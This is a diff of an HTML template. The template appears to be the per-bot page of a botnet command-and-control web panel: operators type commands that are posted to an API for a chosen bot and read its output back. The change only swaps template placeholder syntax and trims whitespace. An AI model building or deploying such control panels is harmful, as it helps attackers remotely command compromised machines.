@@ -6,23 +6,23 @@
 
     <link rel="stylesheet" type="text/css" href="../static/css/stylesheet.css" media="screen">
     <link rel="stylesheet" type="text/css" href="../static/css/github-dark.css" media="screen">
-    <title>{{botid}}</title>
+    <title>${botid}</title>
   </head>
 
   <body>
     <header>
       <div class="container">
-        <h1>{{botid}}</h1>
+        <h1>${botid}</h1>
         <a href="../cnc">&lt;&lt; Back</a>
         <h2 style="text-align: right"><a href="../passchange">Change Password</a>  <a href="../disconnect">Disconnect</a></h2>
       </div>
     </header>
 
-    <div class="container"> 
+    <div class="container">
 	<section id="main_content">
-		
+
 		<pre id="terminal" style="width:80%;"></pre>
-		
+
 		<input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)" style="width: 50%" />
 		<button type="submit" onclick="send_command()">Send</button>
 
@@ -37,17 +37,17 @@
 		    return false;
 		}
 		function send_command(e) {
-		    $.post("../api/push", {'botid': '{{botid}}', 'cmd': $('#cmd').val()});
+		    $.post("../api/push", {'botid': '${botid}', 'cmd': $('#cmd').val()});
 		    $('#cmd').val('');
 		    return false;
 		}
 		function refresh_term() {
-		    $('#terminal').load("../api/stdout?botid={{botid}}");
+		    $('#terminal').load("../api/stdout?botid=${botid}");
             if (!$('#terminal').is(':hover')) {
                termdiv = document.getElementById('terminal');
                termdiv.scrollTop = termdiv.scrollHeight;
             }
-            
+
 		}
 		setInterval(refresh_term, 5000)
 		$(document).ready(function(){
@@ -58,6 +58,6 @@
 
 	</section>
     </div>
-  
+
   </body>
 </html>
